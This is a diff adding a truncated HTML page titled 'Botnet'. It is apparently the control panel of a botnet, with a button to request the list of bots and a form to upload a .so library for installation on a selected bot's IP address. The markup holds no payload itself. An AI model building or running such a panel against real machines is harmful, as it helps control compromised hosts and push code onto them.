@@ -1,0 +1,28 @@
+<!doctype html>
+<html lang="fr">
+
+  <head>
+    <meta charset="utf-8">
+    <title>Form page : Botnet</title>
+  </head>
+
+  <body>
+    <h1>Botnet</h1>
+    <form action="./list.html" method="POST" enctype="multipart/form-data">
+      <div class="button">
+        <input type="submit" name="list_button" value="Request bots list">
+      </div>
+    </form>
+    <h2>Install dynamic library</h2>
+    <form action="./install.html" method="POST" enctype="multipart/form-data">
+      <div>
+        <input type="hidden", name="MAX_FILE_SIZE", value="100000">
+      </div>
+      <div>
+        <label for="name">Import File (.so) : </label>
+        <input type="file", name="file_name" required>
+      </div>
+      <div>
+        <label for="host">Bot's IP address (host) : </label>
+        <select id="host", name="host" required>
+          <option> </option>
